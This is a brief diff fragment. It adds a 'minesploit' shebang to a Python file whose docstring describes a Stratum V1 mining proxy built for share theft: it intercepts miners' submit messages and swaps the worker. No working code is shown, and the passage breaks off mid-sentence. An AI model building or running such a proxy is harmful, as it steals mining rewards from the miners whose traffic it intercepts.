@@ -1,3 +1,4 @@
+#!/usr/bin/env -S minesploit -s
 """Stratum V1 Mining Proxy - Share Theft Implementation
 
 This proxy intercepts mining.submit messages from miners, replaces the worker
